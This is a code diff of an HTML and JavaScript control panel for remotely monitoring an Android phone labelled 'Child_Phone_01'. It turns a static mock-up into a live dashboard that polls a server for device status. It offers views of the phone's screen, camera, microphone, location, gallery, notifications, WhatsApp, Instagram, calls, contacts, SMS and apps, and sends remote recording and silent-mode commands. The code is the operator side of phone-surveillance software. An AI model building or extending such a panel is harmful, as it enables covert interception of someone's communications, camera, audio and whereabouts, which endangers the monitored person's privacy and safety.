@@ -13,103 +13,65 @@
             --text-main: #ffffff;
             --text-muted: #aaaaaa;
             --accent: #4caf50;
+            --offline: #ff4444;
         }
 
         body {
             background-color: var(--bg-color);
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 20px;
+            display: flex; justify-content: center;
         }
 
         .container {
-            width: 100%;
-            max-width: 450px;
+            width: 100%; max-width: 450px;
             background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px;
-            padding: 20px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            border-radius: 30px; padding: 20px;
             border: 1px solid var(--glass-border);
         }
 
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        .device-name { font-size: 1.2rem; font-weight: bold; }
+        /* Status Header */
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .device-name { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; }
+        
         .status-badge {
-            background: #333;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            display: flex;
-            align-items: center;
-            gap: 5px;
+            background: #222; padding: 5px 12px; border-radius: 20px;
+            font-size: 0.75rem; display: flex; align-items: center; gap: 8px;
         }
-        .dot { height: 8px; width: 8px; background-color: var(--accent); border-radius: 50%; }
+        .dot { height: 10px; width: 10px; border-radius: 50%; background: #555; transition: 0.3s; }
+        .dot.online { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
+        .dot.offline { background: var(--offline); box-shadow: 0 0 10px var(--offline); }
 
-        .info-panel {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
+        /* Info Panel */
+        .info-panel { display: flex; gap: 12px; margin-bottom: 20px; }
         .info-card {
-            flex: 1;
-            background: var(--glass-bg);
-            padding: 15px;
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--glass-border);
+            flex: 1; background: var(--glass-bg); padding: 12px;
+            border-radius: 15px; border: 1px solid var(--glass-border);
         }
-        .label { font-size: 0.7rem; color: var(--text-muted); letter-spacing: 1px; }
-        .value { font-size: 1rem; margin-top: 5px; font-weight: 500; }
+        .label { font-size: 0.65rem; color: var(--text-muted); letter-spacing: 1px; margin-bottom: 5px; }
+        .value { font-size: 0.9rem; font-weight: 500; }
 
-        .battery-details { margin-bottom: 25px; padding: 10px; }
-        .battery-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            font-size: 0.9rem;
-            color: var(--text-muted);
-        }
+        /* Battery Section */
+        .battery-details { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 15px; margin-bottom: 20px; }
+        .battery-header { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.85rem; }
+        .battery-bar-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; overflow: hidden; }
+        .battery-bar-fill { width: 0%; height: 100%; background: var(--accent); transition: 1s ease-in-out; }
 
-        .controls-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-        }
-
-        /* Updated control-btn to support links */
+        /* Grid Controls */
+        .controls-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
         .control-btn {
-            background: var(--glass-bg);
-            border-radius: 18px;
-            aspect-ratio: 1/1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid var(--glass-border);
-            cursor: pointer;
-            transition: 0.2s;
-            text-decoration: none; /* Link underline hatane ke liye */
-            color: var(--text-main); /* Link color white rakhne ke liye */
+            background: var(--glass-bg); border-radius: 18px; aspect-ratio: 1/1;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            border: 1px solid var(--glass-border); cursor: pointer;
+            transition: 0.2s; text-decoration: none; color: var(--text-main);
         }
-        .control-btn:hover {
-            background: rgba(255, 255, 255, 0.2);
-            transform: translateY(-2px);
-        }
-        .control-btn i { font-size: 1.2rem; margin-bottom: 8px; color: #fff; }
-        .control-btn span { font-size: 0.65rem; text-align: center; color: #ddd; }
+        .control-btn:hover { background: rgba(255, 255, 255, 0.15); transform: translateY(-2px); border-color: var(--accent); }
+        .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
+        .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
 
-        .fa-whatsapp { color: #25D366 !important; }
-        .fa-instagram { color: #E1306C !important; }
-        .fa-snapchat { color: #FFFC00 !important; text-shadow: 0 0 2px #000; }
+        .fa-whatsapp { color: #25D366; } .fa-instagram { color: #E1306C; } .fa-location-dot { color: #ff4444; }
     </style>
 </head>
 <body>
@@ -117,112 +79,115 @@
     <div class="container">
         <div class="header">
             <div>
-                <i class="fa-solid fa-bars"></i>
-                <span class="device-name" style="margin-left: 10px;">VIVO V2225C</span>
+                <i class="fa-solid fa-mobile-side"></i>
+                <span class="device-name" id="deviceName">Detecting...</span>
             </div>
             <div class="status-badge">
-                <span class="dot"></span> Connected
+                <span id="statusDot" class="dot"></span>
+                <span id="statusText">Connecting...</span>
             </div>
         </div>
 
         <div class="info-panel">
             <div class="info-card">
-                <div class="label">VERSION</div>
-                <div class="value">Android 15</div>
+                <div class="label">ANDROID</div>
+                <div id="androidVer" class="value">--</div>
             </div>
             <div class="info-card">
                 <div class="label">NETWORK</div>
-                <div class="value">Online <i class="fa-solid fa-wifi"></i></div>
+                <div id="networkType" class="value">Searching...</div>
             </div>
         </div>
 
         <div class="battery-details">
-            <div class="label" style="margin-bottom: 5px;">BATTERY INFO</div>
-            <div class="battery-grid">
-                <span>26%</span> <span>16°C</span>
-                <span>GOOD</span> <span>3753 mA</span>
-                <span style="grid-column: span 2;">DISCHARGING</span>
+            <div class="battery-header">
+                <span class="label">BATTERY LEVEL</span>
+                <span id="batteryPercent" class="value">0%</span>
             </div>
+            <div class="battery-bar-bg">
+                <div id="batteryFill" class="battery-bar-fill"></div>
+            </div>
+            <div id="batteryStatus" style="font-size: 0.7rem; color: var(--text-muted); margin-top: 8px;">Waiting for data...</div>
         </div>
 
         <div class="controls-grid">
-            <div class="control-btn" onclick="sendCommand('screen_share')">
-                <i class="fa-solid fa-mobile-screen"></i><span>Screen</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('camera')">
-                <i class="fa-solid fa-camera"></i><span>Camera</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('audio')">
-                <i class="fa-solid fa-microphone"></i><span>Audio</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('location')">
-                <i class="fa-solid fa-location-dot"></i><span>Location</span>
-            </div>
-
-            <div class="control-btn" onclick="sendCommand('gallery')">
-                <i class="fa-solid fa-images"></i><span>Gallery</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('notifications')">
-                <i class="fa-regular fa-message"></i><span>Notify</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('sound')">
-                <i class="fa-solid fa-bell"></i><span>Sound</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('recording')">
-                <i class="fa-solid fa-circle-dot"></i><span>Rec</span>
-            </div>
-
-            <div class="control-btn" onclick="sendCommand('whatsapp')">
-                <i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('instagram')">
-                <i class="fa-brands fa-instagram"></i><span>Instagram</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('snapchat')">
-                <i class="fa-brands fa-snapchat"></i><span>Snapchat</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('signal')">
-                <i class="fa-solid fa-comment-dots"></i><span>Signal</span>
-            </div>
-
-            <a href="view_call_logs.html" class="control-btn">
-                <i class="fa-solid fa-phone"></i><span>Call Logs</span>
-            </a>
+            <a href="view_screen.html" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></a>
+            <a href="view_camera.html" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></a>
+            <a href="view_audio.html" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></a>
+            <a href="view_location.html" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
+            <a href="view_gallery.html" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></a>
+            <a href="view_notifications.html" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></a>
             
-            <a href="view_contacts.html" class="control-btn">
-                <i class="fa-solid fa-address-book"></i><span>Contacts</span>
-            </a>
+            <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
+                <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Sound</span>
+            </div>
 
-            <div class="control-btn" onclick="sendCommand('sms')">
-                <i class="fa-solid fa-comments"></i><span>SMS</span>
-            </div>
-            <div class="control-btn" onclick="sendCommand('apps')">
-                <i class="fa-brands fa-google-play"></i><span>Apps</span>
-            </div>
+            <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
+            <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
+            <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></a>
+            <a href="view_call_logs.html" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
+            <a href="view_contacts.html" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
+            <a href="view_sms.html" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
+            <a href="view_apps.html" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></a>
         </div>
     </div>
 
     <script>
-  
-    function sendCommand(action) {
-        console.log("Sending command: " + action);
+        // --- REAL-TIME DATA FETCHING ---
+        function updateDashboard() {
+            fetch('/api/device-status/Child_Phone_01')
+                .then(res => res.json())
+                .then(data => {
+                    // Update Device Name & Version
+                    document.getElementById('deviceName').innerText = data.model || "Unknown Device";
+                    document.getElementById('androidVer').innerText = "V" + (data.android_version || "--");
+                    
+                    // Update Connection Status
+                    const dot = document.getElementById('statusDot');
+                    const statusText = document.getElementById('statusText');
+                    if(data.isOnline) {
+                        dot.className = "dot online";
+                        statusText.innerText = "Connected";
+                        document.getElementById('networkType').innerText = data.network || "WiFi/4G";
+                    } else {
+                        dot.className = "dot offline";
+                        statusText.innerText = "Disconnected";
+                        document.getElementById('networkType').innerText = "Offline";
+                    }
 
-        // Server ko batao ki ye command bhejna hai
-        fetch('/api/send-command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                device_id: 'Child_Phone_01', // Filhal hardcoded hai
-                command: action
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            alert("Command Sent: " + action);
-        })
-        .catch(err => console.error("Error:", err));
-    }
-</script>
-   
+                    // Update Battery
+                    const battery = data.battery || 0;
+                    document.getElementById('batteryPercent').innerText = battery + "%";
+                    document.getElementById('batteryFill').style.width = battery + "%";
+                    document.getElementById('batteryStatus').innerText = data.isCharging ? "Charging..." : "Discharging (" + data.batteryTemp + "°C)";
+                    
+                    // Battery Color change
+                    document.getElementById('batteryFill').style.background = battery < 20 ? "#ff4444" : "#4caf50";
+                })
+                .catch(err => console.log("Waiting for server..."));
+        }
+
+        // Poll server every 3 seconds for updates
+        setInterval(updateDashboard, 3000);
+
+        // Sound Mode Switcher
+        let currentMode = 0;
+        function cycleSoundMode() {
+            const icon = document.getElementById('soundIcon');
+            const text = document.getElementById('soundText');
+            currentMode = (currentMode + 1) % 3;
+            if(currentMode === 0) { icon.className = "fa-solid fa-bell"; text.innerText = "Normal"; sendCommand('ring'); }
+            else if(currentMode === 1) { icon.className = "fa-solid fa-vibration"; text.innerText = "Vibrate"; sendCommand('vibrate'); }
+            else { icon.className = "fa-solid fa-bell-slash"; text.innerText = "Silent"; sendCommand('silent'); }
+        }
+
+        function sendCommand(action) {
+            fetch('/api/send-command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ device_id: 'Child_Phone_01', command: action })
+            });
+        }
+    </script>
 </body>
 </html>
